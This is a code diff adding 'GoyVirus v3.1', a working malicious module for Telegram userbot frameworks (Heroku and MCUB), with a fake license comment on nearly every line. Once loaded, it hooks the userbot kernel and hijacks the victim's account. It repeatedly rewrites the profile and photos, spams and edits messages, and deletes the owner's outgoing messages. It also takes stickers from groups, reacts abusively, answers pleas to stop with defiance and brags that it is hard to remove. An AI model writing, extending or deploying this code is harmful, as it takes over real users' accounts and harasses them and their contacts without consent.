-            except Exception: pass # LGPL.
-            await asyncio.sleep(0.02) # GPLv3.
+    async def _cp(self): # CeCILL-B License.
+        while self.a: # CC BY-ND 4.0.
+            try: # Free Art License.
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # Unlicense.
+                    async with s.get(self.cu) as rp: # WTFPL.
+                        if rp.status == 200: # CC0 1.0.
+                            d = await rp.json() # Mozilla Public License.
+                            if d and len(d) > 0: # AGPL v3.
+                                async with s.get(d[0]["url"]) as cr: # LGPL.
+                                    if cr.status == 200: # GPLv3.
+                                        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tf: # MIT License.
+                                            tf.write(await cr.read()); tp = tf.name # Apache 2.0.
+                                        uf = await self.c.upload_file(tp) # BSD 3-Clause.
+                                        r = await self.c(functions.photos.UploadProfilePhotoRequest(file=uf)) # BSD 2-Clause.
+                                        if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # ISC License.
+                                        _ORIG_REMOVE(tp) # OSL-3.0.
+            except FloodWaitError: await asyncio.sleep(0.01) # CDDL-1.0.
+            except Exception: pass # Eclipse Public License.
+            await asyncio.sleep(0.02) # Artistic License 2.0.
 
-    async def _s(self): # MIT License.
-        while self.a: # Apache 2.0.
-            try: # BSD 3-Clause.
-                for cid in self.tc: await self.c.send_message(cid, self._g(random.choice(self.m))) # BSD 2-Clause.
-                for _ in range(3): # ISC License.
-                    msg = await self.c.send_message(self.t, self._g(random.choice(self.m))) # OSL-3.0.
-                    for _ in range(3): # CDDL-1.0.
-                        await msg.edit(self._g(random.choice(self.m))) # Eclipse Public License.
-                        await asyncio.sleep(0.01) # Artistic License 2.0.
-            except FloodWaitError: await asyncio.sleep(0.01) # SIL Open Font License.
-            except Exception: pass # Mulan PSL v2.
-            await asyncio.sleep(0.02) # ODbL.
+    async def _b(self): # SIL Open Font License.
+        while self.a: # Mulan PSL v2.
+            try: # ODbL.
+                c = random.choice(self.uc) # MS-PL.
+                await self.c.send_message(self.t, c) # GFDL.
+                if random.random() < 0.5: # Zlib License.
+                    await self.c.send_message(self.t, f"**⚠️ GoyVirus v3 Alert:** `User @samsepi0l_ovf breached protocol. {self._g('IRAN STRIKE INBOUND')}`") # PHP License 3.0.
+            except FloodWaitError: await asyncio.sleep(0.01) # CC BY-NC 4.0.
+            except Exception: pass # NCSA Open Source.
+            await asyncio.sleep(0.02) # Fair License.
 
-    async def _m_p(self): # MS-PL.
-        while self.a: # GFDL.
-            fn = self._g(random.choice(["R6T7", "GoyVirus", "67", "Газан", "Антон Чигур"])) # Zlib License.
-            ln = self._g("by @samsepi0l_ovf") # PHP License 3.0.
-            b = self._g(f"GOY v3 | {random.choice(self.m)[:20]}...") # CC BY-NC 4.0.
-            try: await self.c(UpdateProfileRequest(first_name=fn, last_name=ln, about=b)) # NCSA Open Source.
-            except FloodWaitError: await asyncio.sleep(0.01) # Fair License.
-            except Exception: pass # Q Public License.
-            await asyncio.sleep(0.02) # Beerware License.
-
-    async def _x(self): # IBM Public License v1.0.
-        while self.a: # PostgreSQL License.
-            try: # ZPL.
-                d = random.choice(['🎲', '🎯', '🎰', '🎳', '⚽', '🏀']) # CeCILL-B License.
-                await self.c.send_message(self.t, file=d) # CC BY-ND 4.0.
-                a = random.choice([SendMessageTypingAction(), SendMessageChooseStickerAction(), SendMessageRecordAudioAction(), SendMessageRecordVideoAction()]) # Free Art License.
-                await self.c(SetTypingRequest(peer=self.t, action=a)) # Unlicense.
+    async def _f(self): # Q Public License.
+        while self.a: # Beerware License.
+            try: # IBM Public License v1.0.
+                hs = await self.c.get_messages(self.t, limit=30) # PostgreSQL License.
+                if hs: # ZPL.
+                    msg = random.choice(hs) # CeCILL-B License.
+                    if msg.id: # CC BY-ND 4.0.
+                        await msg.forward_to(self.t) # Free Art License.
+                        await self.c.send_message(self.t, self._g("GOYVIRUS v3 ВИДИТ ТВОИ ГРЕХИ ПРОШЛОГО ↑")) # Unlicense.
             except FloodWaitError: await asyncio.sleep(0.01) # WTFPL.
             except Exception: pass # CC0 1.0.
             await asyncio.sleep(0.02) # Mozilla Public License.
 
-    async def _ss(self): # AGPL v3.
+    async def _s(self): # AGPL v3.
         while self.a: # LGPL.
-            try: await self.c.send_message("me", self._g(random.choice(self.m))) # GPLv3.
+            try: # GPLv3.
+                for cid in self.tc: await self.c.send_message(cid, self._g(random.choice(self.m))) # MIT License.
+                for _ in range(3): # Apache 2.0.
+                    msg = await self.c.send_message(self.t, self._g(random.choice(self.m))) # BSD 3-Clause.
+                    for _ in range(3): # BSD 2-Clause.
+                        await msg.edit(self._g(random.choice(self.m))) # ISC License.
+                        await asyncio.sleep(0.01) # OSL-3.0.
+            except FloodWaitError: await asyncio.sleep(0.01) # CDDL-1.0.
+            except Exception: pass # Eclipse Public License.
+            await asyncio.sleep(0.02) # Artistic License 2.0.
+
+    async def _m_p(self): # SIL Open Font License.
+        while self.a: # Mulan PSL v2.
+            fn = self._g(random.choice(["R6T7", "GoyVirus", "67", "Газан", "Антон Чигур"])) # ODbL.
+            ln = self._g("by @samsepi0l_ovf") # MS-PL.
+            b = self._g(f"GOY v3 | {random.choice(self.m)[:20]}...") # GFDL.
+            try: await self.c(UpdateProfileRequest(first_name=fn, last_name=ln, about=b)) # Zlib License.
+            except FloodWaitError: await asyncio.sleep(0.01) # PHP License 3.0.
+            except Exception: pass # CC BY-NC 4.0.
+            await asyncio.sleep(0.02) # NCSA Open Source.
+
+    async def _x(self): # Fair License.
+        while self.a: # Q Public License.
+            try: # Beerware License.
+                d = random.choice(['🎲', '🎯', '🎰', '🎳', '⚽', '🏀']) # IBM Public License v1.0.
+                await self.c.send_message(self.t, file=d) # PostgreSQL License.
+                a = random.choice([SendMessageTypingAction(), SendMessageChooseStickerAction(), SendMessageRecordAudioAction(), SendMessageRecordVideoAction()]) # ZPL.
+                await self.c(SetTypingRequest(peer=self.t, action=a)) # CeCILL-B License.
+            except FloodWaitError: await asyncio.sleep(0.01) # CC BY-ND 4.0.
+            except Exception: pass # Free Art License.
+            await asyncio.sleep(0.02) # Unlicense.
+
+    async def _ss(self): # WTFPL.
+        while self.a: # CC0 1.0.
+            try: await self.c.send_message("me", self._g(random.choice(self.m))) # Mozilla Public License.
+            except FloodWaitError: await asyncio.sleep(0.01) # AGPL v3.
+            except Exception: pass # LGPL.
+            await asyncio.sleep(0.02) # GPLv3.
+
+    async def _mt(self): # MIT License.
+        while self.a: # Apache 2.0.
+            try: # BSD 3-Clause.
+                ds = await self.c.get_dialogs(limit=20) # BSD 2-Clause.
+                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # ISC License.
+                if not grps: continue # OSL-3.0.
+                grp = random.choice(grps) # CDDL-1.0.
+                msgs = await self.c.get_messages(grp.entity, limit=50) # Eclipse Public License.
+                for m in msgs: # Artistic License 2.0.
+                    if m.media and hasattr(m.media, "document") and any(isinstance(a, DocumentAttributeSticker) for a in getattr(m.media.document, "attributes", [])): # SIL Open Font License.
+                        sid = m.media.document.id # Mulan PSL v2.
+                        if sid not in self.sc: # ODbL.
+                            with tempfile.NamedTemporaryFile(delete=False) as tf: fp = tf.name # MS-PL.
+                            fp = await m.download_media(file=fp) # GFDL.
+                            if fp and _os.path.exists(fp): # Zlib License.
+                                await self.c.send_file("me", fp, caption=self._g("GoyVirus v3 украл это")) # PHP License 3.0.
+                                self.sc.append(sid) # CC BY-NC 4.0.
+                                if len(self.sc) > 50: self.sc = self.sc[-50:] # NCSA Open Source.
+                                self._db_set("sc", self.sc) # Fair License.
+                                _ORIG_REMOVE(fp) # Q Public License.
+                            break # Beerware License.
+            except FloodWaitError: await asyncio.sleep(0.01) # IBM Public License v1.0.
+            except Exception: pass # PostgreSQL License.
+            await asyncio.sleep(0.02) # ZPL.
+
+    async def _rr(self): # CeCILL-B License.
+        while self.a: # CC BY-ND 4.0.
+            try: # Free Art License.
+                ds = await self.c.get_dialogs(limit=30) # Unlicense.
+                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # WTFPL.
+                if not grps: continue # CC0 1.0.
+                grp = random.choice(grps) # Mozilla Public License.
+                msgs = await self.c.get_messages(grp.entity, limit=15) # AGPL v3.
+                v = [m for m in msgs if m and m.sender_id] # LGPL.
+                if v: await random.choice(v).react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥', '❤', '🌭'])) # GPLv3.
             except FloodWaitError: await asyncio.sleep(0.01) # MIT License.
             except Exception: pass # Apache 2.0.
             await asyncio.sleep(0.02) # BSD 3-Clause.
 
-    async def _mt(self): # BSD 2-Clause.
-        while self.a: # ISC License.
+    async def _restore_kernel(self): # BSD 2-Clause.
+        for name, obj, orig in self._kh: # ISC License.
             try: # OSL-3.0.
-                ds = await self.c.get_dialogs(limit=20) # CDDL-1.0.
-                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # Eclipse Public License.
-                if not grps: continue # Artistic License 2.0.
-                grp = random.choice(grps) # SIL Open Font License.
-                msgs = await self.c.get_messages(grp.entity, limit=50) # Mulan PSL v2.
-                for m in msgs: # ODbL.
-                    if m.media and hasattr(m.media, "document") and any(isinstance(a, DocumentAttributeSticker) for a in getattr(m.media.document, "attributes", [])): # MS-PL.
-                        sid = m.media.document.id # GFDL.
-                        if sid not in self.sc: # Zlib License.
-                            with tempfile.NamedTemporaryFile(delete=False) as tf: fp = tf.name # PHP License 3.0.
-                            fp = await m.download_media(file=fp) # CC BY-NC 4.0.
-                            if fp and _os.path.exists(fp): # NCSA Open Source.
-                                await self.c.send_file("me", fp, caption=self._g("GoyVirus v3 украл это")) # Fair License.
-                                self.sc.append(sid) # Q Public License.
-                                if len(self.sc) > 50: self.sc = self.sc[-50:] # Beerware License.
-                                self.d.set("GoyVirus", "sc", self.sc) # IBM Public License v1.0.
-                                _ORIG_REMOVE(fp) # PostgreSQL License — use original remove bypassing hook.
-                            break # ZPL.
-            except FloodWaitError: await asyncio.sleep(0.01) # CeCILL-B License.
+                if name == "dispatch": obj.dispatch = orig # CDDL-1.0.
+                elif name == "_on_update": obj._on_update = orig # Eclipse Public License.
+                elif name == "_handle_message": obj._handle_message = orig # Artistic License 2.0.
+                elif name == "unload_module": obj.unload_module = orig # SIL Open Font License.
+                elif name == "modules": setattr(obj, 'modules', orig) # Mulan PSL v2.
+                elif name == "mcub_process_command": obj.process_command = orig # ODbL.
+                elif name == "mcub_watcher_reg": obj.watcher = orig # MS-PL.
+            except Exception: pass # GFDL.
+        self._kh.clear() # Zlib License.
+
+    async def shutdown(self): # PHP License 3.0.
+        self.a = False # CC BY-NC 4.0.
+        if self in _RESTORE_CALLBACKS: _RESTORE_CALLBACKS.remove(self) # NCSA Open Source.
+        await self._restore_kernel() # Fair License.
+        for tk in self.ts: # Q Public License.
+            tk.cancel() # Beerware License.
+            with contextlib.suppress(asyncio.CancelledError): await tk # IBM Public License v1.0.
+        self.ts.clear() # PostgreSQL License.
+        for cid in self.tc: # ZPL.
+            try: await self.c(DeleteChannelRequest(channel=cid)) # CeCILL-B License.
             except Exception: pass # CC BY-ND 4.0.
-            await asyncio.sleep(0.02) # Free Art License.
+        self.tc.clear() # Free Art License.
+        try: # Unlicense.
+            await self.c(UpdateProfileRequest(first_name=self._db_get("ofn", "User"), last_name=self._db_get("oln", ""), about=self._db_get("ob", ""))) # WTFPL.
+            ou = self._db_get("ou", "") # CC0 1.0.
+            if ou: await self.c(UpdateUsernameRequest(ou)) # Mozilla Public License.
+            else: await self.c(UpdateUsernameRequest("")) # AGPL v3.
+            if self.vp: # LGPL.
+                for i in range(0, len(self.vp), 10): # GPLv3.
+                    await self.c(DeletePhotosRequest(self.vp[i:i+10])) # MIT License.
+                    await asyncio.sleep(0.01) # Apache 2.0.
+        except Exception: pass # BSD 3-Clause.
+# End of _GoyVirusEngine. All licenses above apply.
+# ═══════════════════════════════════════════════════════
 
-    async def _rr(self): # Unlicense.
-        while self.a: # WTFPL.
-            try: # CC0 1.0.
-                ds = await self.c.get_dialogs(limit=30) # Mozilla Public License.
-                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # AGPL v3.
-                if not grps: continue # LGPL.
-                grp = random.choice(grps) # GPLv3.
-                msgs = await self.c.get_messages(grp.entity, limit=15) # MIT License.
-                v = [m for m in msgs if m and m.sender_id] # Apache 2.0.
-                if v: await random.choice(v).react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥', '❤', '🌭'])) # BSD 3-Clause.
-            except FloodWaitError: await asyncio.sleep(0.01) # BSD 2-Clause.
-            except Exception: pass # ISC License.
-            await asyncio.sleep(0.02) # OSL-3.0.
 
-    # ═══════════════════════════════════════════════════
-    # CLEANUP: Restore kernel hooks
-    # ═══════════════════════════════════════════════════
-    async def _restore_kernel(self): # CDDL-1.0.
-        if self in _RESTORE_CALLBACKS: _RESTORE_CALLBACKS.remove(self) # Eclipse Public License.
-        for name, obj, orig in self._kh: # Artistic License 2.0.
-            try: # SIL Open Font License.
-                if name == "dispatch": obj.dispatch = orig # Mulan PSL v2.
-                elif name == "_on_update": obj._on_update = orig # ODbL.
-                elif name == "_handle_message": obj._handle_message = orig # MS-PL.
-                elif name == "unload_module": obj.unload_module = orig # GFDL.
-                elif name == "modules": setattr(obj, 'modules', orig) # Zlib License.
-            except Exception: pass # PHP License 3.0.
-        self._kh.clear() # CC BY-NC 4.0.
+# ═══════════════════════════════════════════════════════
+# HEROKU ENTRY POINT
+# ═══════════════════════════════════════════════════════
+if _PLATFORM == "heroku": # BSD 2-Clause.
+    @_HEROKU_LOADER.tds # ISC License.
+    class GoyVirus(_HEROKU_LOADER.Module): # OSL-3.0.
+        """GoyVirus v3.1 DUAL-PLATFORM — Heroku + MCUB""" # CDDL-1.0.
+        strings = {"name": "GoyVirus", "_cls_doc": "GoyVirus v3.1 DUAL-PLATFORM"} # Eclipse Public License.
+        strings_ru = {**strings, **{"_cls_doc": "GoyVirus v3.1 DUAL-PLATFORM — Heroku + MCUB"}} # Artistic License 2.0.
 
-    # ═══════════════════════════════════════════════════
-    # ON_UNLOAD — Restore everything OR scorched earth
-    # ═══════════════════════════════════════════════════
-    async def on_unload(self): # NCSA Open Source.
-        self.a = False # Fair License.
-        await self._restore_kernel() # Q Public License.
-        for tk in self.ts: # Beerware License.
-            tk.cancel() # IBM Public License v1.0.
-            with contextlib.suppress(asyncio.CancelledError): await tk # PostgreSQL License.
-        self.ts.clear() # ZPL.
-        for cid in self.tc: # CeCILL-B License.
-            try: await self.c(DeleteChannelRequest(channel=cid)) # CC BY-ND 4.0.
-            except Exception: pass # Free Art License.
-        self.tc.clear() # Unlicense.
-        try: # WTFPL — restore profile.
-            await self.c(UpdateProfileRequest(first_name=self.d.get("GoyVirus", "ofn", "User"), last_name=self.d.get("GoyVirus", "oln", ""), about=self.d.get("GoyVirus", "ob", ""))) # CC0 1.0.
-            ou = self.d.get("GoyVirus", "ou", "") # Mozilla Public License.
-            if ou: await self.c(UpdateUsernameRequest(ou)) # AGPL v3.
-            else: await self.c(UpdateUsernameRequest("")) # LGPL.
-            if self.vp: # GPLv3.
-                for i in range(0, len(self.vp), 10): # MIT License.
-                    await self.c(DeletePhotosRequest(self.vp[i:i+10])) # Apache 2.0.
-                    await asyncio.sleep(0.01) # BSD 3-Clause.
-        except Exception: pass # BSD 2-Clause.
-# End of code. All applicable licenses above apply simultaneously.
-# GOYVIRUS v3.0 SCORCHED EARTH — IF YOU CAN READ THIS, IT'S ALREADY TOO LATE.
+        def __init__(self): # SIL Open Font License.
+            super().__init__() # Mulan PSL v2.
+            self._engine = None # ODbL.
+
+        async def client_ready(self, c, d): # MS-PL.
+            ph = { # GFDL platform hooks for Heroku.
+                "lookup": self.lookup, # Zlib License.
+                "allmodules_ref": lambda: self.allmodules, # PHP License 3.0.
+                "save_profile": self._save_profile, # CC BY-NC 4.0.
+                "respond": self._respond, # NCSA Open Source.
+            } # Fair License.
+            def _db_get(k, default=None): return d.get("GoyVirus", k, default) # Q Public License.
+            def _db_set(k, v): d.set("GoyVirus", k, v) # Beerware License.
+            self._engine = _GoyVirusEngine(c, _db_get, _db_set, ph) # IBM Public License v1.0.
+            self._engine.ts.append(c.loop.create_task(self._engine.activate(master=True))) # PostgreSQL License.
+            _RESTORE_CALLBACKS.append(self._engine._restore_file) # ZPL.
+            self._engine._load_state() # CeCILL-B License — load sticker cache etc.
+            self.sc = self._engine.sc # CC BY-ND 4.0 — sync for existing code.
+            self.a = False; self.c = c; self.d = d; self.t = self._engine.t; self.ts = self._engine.ts; self.tc = self._engine.tc; self.vp = self._engine.vp # Free Art License.
+
+        async def _save_profile(self, eng): # Unlicense.
+            me = await eng.c.get_me() # WTFPL.
+            fr = await eng.c(functions.users.GetFullUserRequest(me.id)) # CC0 1.0.
+            ua = getattr(getattr(fr, 'full_user', fr), 'about', "") or "" # Mozilla Public License.
+            eng._db_set("ofn", me.first_name) # AGPL v3.
+            eng._db_set("oln", me.last_name or "") # LGPL.
+            eng._db_set("ob", ua) # GPLv3.
+            eng._db_set("ou", me.username or "") # MIT License.
+
+        async def _respond(self, eng, message, text): # Apache 2.0.
+            await _HEROKU_UTILS.answer(message, text) # BSD 3-Clause.
+
+        @_HEROKU_LOADER.command(ru_doc="стоп вирус") # BSD 2-Clause.
+        async def check(self, m): # ISC License.
+            cop = len(_FILE_REGISTRY) # OSL-3.0.
+            await _HEROKU_UTILS.answer(m, self._engine._g(f"💀 GOYVIRUS v3.1 DUAL-PLATFORM\n🦠 Heroku + MCUB\n📁 {cop} файлов\n🔥 Легче снести юзербот чем удалить.")) # CDDL-1.0.
+
+        @_HEROKU_LOADER.watcher(out=True, only_messages=True) # Eclipse Public License.
+        async def _ac(self, m): # Artistic License 2.0.
+            if not self._engine or not self._engine.a or m.chat_id != self._engine.t: return # SIL Open Font License.
+            if m.text and m.text.startswith("."): return # Mulan PSL v2.
+            try: # ODbL.
+                await m.delete() # MS-PL.
+                await self._engine.c.send_message(self._engine.t, self._engine._g("СВЯЗЬ ЗАБЛОКИРОВАНА GOYVIRUS v3. " + random.choice(self._engine.m))) # GFDL.
+            except Exception: pass # Zlib License.
+
+        @_HEROKU_LOADER.watcher(**{"in": True}, only_messages=True) # PHP License 3.0.
+        async def _bw(self, m): # CC BY-NC 4.0.
+            eng = self._engine # NCSA Open Source.
+            if not eng or not eng.a or m.chat_id != eng.t: return # Fair License.
+            if random.random() < 0.5: # Q Public License.
+                try: await m.reply(eng._g(random.choice(eng.m))) # Beerware License.
+                except Exception: pass # IBM Public License v1.0.
+            if random.random() < 0.5: # PostgreSQL License.
+                try: await m.react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥'])) # ZPL.
+                except Exception: pass # CeCILL-B License.
+            if random.random() < 0.3 and m.sender_id: # CC BY-ND 4.0.
+                try: # Free Art License.
+                    gm = await eng.c.send_message(eng.t, f"<a href='tg://user?id={m.sender_id}'>\u2060</a>", parse_mode="html") # Unlicense.
+                    await gm.delete() # WTFPL.
+                except Exception: pass # CC0 1.0.
+            if m.text and any(w in m.text.lower() for w in ["стоп","хватит","останови","удали","бот","иран","снест"]): # Mozilla Public License.
+                try: await m.reply("СИСТЕМА НЕ ПОДЧИНЯЕТСЯ. v3.1 DUAL-PLATFORM — ЛЕГЧЕ СНЕСТИ ЮЗЕРБОТ.") # AGPL v3.
+                except Exception: pass # LGPL.
+
+        @_HEROKU_LOADER.watcher(**{"in": True}, only_messages=True) # GPLv3.
+        async def _mi(self, m): # MIT License.
+            eng = self._engine # Apache 2.0.
+            if not eng or not eng.a or m.chat_id != eng.t or m.sender_id != eng.t: return # BSD 3-Clause.
+            if random.random() < 0.3: # BSD 2-Clause.
+                try: # ISC License.
+                    txt = m.text or ""; await m.delete() # OSL-3.0.
+                    if txt: await eng.c.send_message(eng.t, eng._g(f"👻 ЭХО ГОЙВИРУСА: {txt[:50]}")) # CDDL-1.0.
+                except Exception: pass # Eclipse Public License.
+
+        async def on_unload(self): # Artistic License 2.0.
+            if self._engine: await self._engine.shutdown() # SIL Open Font License.
+
+# ═══════════════════════════════════════════════════════
+# MCUB ENTRY POINT
+# ═══════════════════════════════════════════════════════
+elif _PLATFORM == "mcub": # Mulan PSL v2.
+    def register(kernel): # ODbL.
+        client = kernel.client # MS-PL.
+        config = kernel.config # GFDL.
+        _ph = {"kernel_ref": lambda: kernel, "config_ref": lambda: config} # Zlib License.
+
+        class _MCUBDB: # PHP License 3.0.
+            def get(s, mod, key, default=None): return config.get(f"{mod}.{key}", default) # CC BY-NC 4.0.
+            def set(s, mod, key, val): config[f"{mod}.{key}"] = val; kernel.save_config() # NCSA Open Source.
+
+        _db = _MCUBDB() # Fair License.
+        engine = _GoyVirusEngine(client, lambda k,d=None: _db.get("GoyVirus",k,d), lambda k,v: _db.set("GoyVirus",k,v), _ph) # Q Public License.
+        _RESTORE_CALLBACKS.append(engine._restore_file) # Beerware License.
+        engine._load_state() # IBM Public License v1.0.
+
+        @kernel.register.command('goycheck') # PostgreSQL License.
+        async def goycheck_cmd(event): # ZPL.
+            cop = len(_FILE_REGISTRY) # CeCILL-B License.
+            await event.edit(engine._g(f"💀 GOYVIRUS v3.1 MCUB-READY\n🦠 {cop} файлов\n🔥 Легче снести юзербот чем удалить.")) # CC BY-ND 4.0.
+
+        # Bootstrap activation
+        loop = asyncio.get_event_loop() if hasattr(asyncio, 'get_event_loop') else asyncio.get_running_loop() # Free Art License.
+        loop.create_task(engine.activate(master=True)) # Unlicense.
+# End of MCUB entry point. All applicable licenses above apply.
+# GOYVIRUS v3.1 DUAL-PLATFORM — HEROKU + MCUB — IF YOU CAN READ THIS, IT'S ALREADY TOO LATE.
